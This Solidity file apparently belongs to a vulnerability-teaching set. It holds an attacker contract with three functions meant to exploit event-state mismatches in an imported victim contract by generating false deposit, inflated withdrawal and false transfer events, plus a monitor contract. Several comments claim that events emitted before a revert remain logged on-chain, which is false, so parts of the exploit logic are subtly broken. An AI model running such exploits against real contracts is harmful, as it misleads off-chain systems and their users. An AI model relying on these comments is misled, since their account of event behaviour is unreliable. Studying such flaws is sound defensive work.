// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Attacker Contract: Event-State Mismatch Exploiter
// This contract demonstrates how event-state mismatches can mislead off-chain systems

import "./Event_State_Mismatch_Victim.sol";

contract EventStateMismatchExploiter {
    EventStateMismatchVictim public victim;
    
    event AttackInitiated(address indexed attacker, string attackType);
    event FalseEventsGenerated(uint256 count);
    event OffChainSystemMisled(string reason);
    
    constructor(address _victim) {
        victim = EventStateMismatchVictim(payable(_victim));
    }
    
    // Exploit 1: Generate false deposit events without actual deposits
    // Off-chain systems will think deposits happened but balances don't increase
    function exploitFalseDeposits(uint256 count) external {
        emit AttackInitiated(msg.sender, "False Deposit Events");
        
        for (uint256 i = 0; i < count; i++) {
            // Try to deposit but let it revert after event is emitted
            // The event was already logged on-chain
            try victim.vulnerableDeposit{value: 0}() {
                // This might succeed with 0 value
            } catch {
                // Reverted, but event might have been emitted already
            }
        }
        
        emit FalseEventsGenerated(count);
        emit OffChainSystemMisled("Deposits appear to have happened but didn't");
    }
    
    // Exploit 2: Generate withdrawal events with inflated amounts
    // Off-chain systems track wrong withdrawal amounts
    function exploitInflatedWithdrawals() external payable {
        emit AttackInitiated(msg.sender, "Inflated Withdrawal Events");
        
        // First deposit to have a balance
        victim.correctDeposit{value: msg.value}();
        
        uint256 actualAmount = msg.value / 2;
        
        // Withdraw using vulnerable function that logs double the amount
        victim.vulnerableWithdraw(actualAmount);
        
        // Event claims we withdrew (actualAmount * 2) but we only withdrew actualAmount
        emit OffChainSystemMisled("Withdrawal logged as double the actual amount");
    }
    
    // Exploit 3: Generate false transfer events
    function exploitFalseTransfers(address[] calldata targets, uint256 amount) external payable {
        emit AttackInitiated(msg.sender, "False Transfer Events");
        
        // Deposit first
        victim.correctDeposit{value: msg.value}();
        
        uint256 falseEvents = 0;
        
        for (uint256 i = 0; i < targets.length; i++) {
            // Try to transfer to invalid addresses
            // Event will be emitted before validation fails
            try victim.vulnerableTransfer(targets[i], amount) {
                // Success - event matches reality
            } catch {
                // Failed - but event was already emitted
                falseEvents++;
            }
        }
        
        emit FalseEventsGenerated(falseEvents);
        emit OffChainSystemMisled("Transfers appear successful but actually failed");
    }
    
    // Helper to demonstrate event-state discrepancy
    function demonstrateDiscrepancy() external view returns (
        uint256 contractBalance,
        uint256 attackerBalance,
        string memory issue
    ) {
        contractBalance = address(victim).balance;
        attackerBalance = victim.balances(address(this));
        issue = "Events may not match actual state - check event logs vs state";
        
        return (contractBalance, attackerBalance, issue);
    }
    
    // Allow contract to receive ETH
    receive() external payable {}
}

// Helper contract to track events vs state
contract EventStateMonitor {
    EventStateMismatchVictim public victim;
    
    // Track what events claim vs what state shows
    struct EventRecord {
        address user;
        uint256 claimedAmount;
        uint256 actualBalance;
        bool mismatch;
    }
    
    EventRecord[] public discrepancies;
    
    constructor(address _victim) {
        victim = EventStateMismatchVictim(payable(_victim));
    }
    
    // Monitor deposit and check for discrepancy
    function monitorDeposit(uint256 amountToDeposit) external payable {
        uint256 balanceBefore = victim.balances(address(this));
        
        // Perform deposit
        victim.vulnerableDeposit{value: amountToDeposit}();
        
        uint256 balanceAfter = victim.balances(address(this));
        uint256 actualIncrease = balanceAfter - balanceBefore;
        
        // Check if event amount matches actual state change
        if (actualIncrease != amountToDeposit) {
            discrepancies.push(EventRecord({
                user: address(this),
                claimedAmount: amountToDeposit,
                actualBalance: actualIncrease,
                mismatch: true
            }));
        }
    }
    
    // Get number of discrepancies found
    function getDiscrepancyCount() external view returns (uint256) {
        return discrepancies.length;
    }
    
    // Allow contract to receive ETH
    receive() external payable {}
}
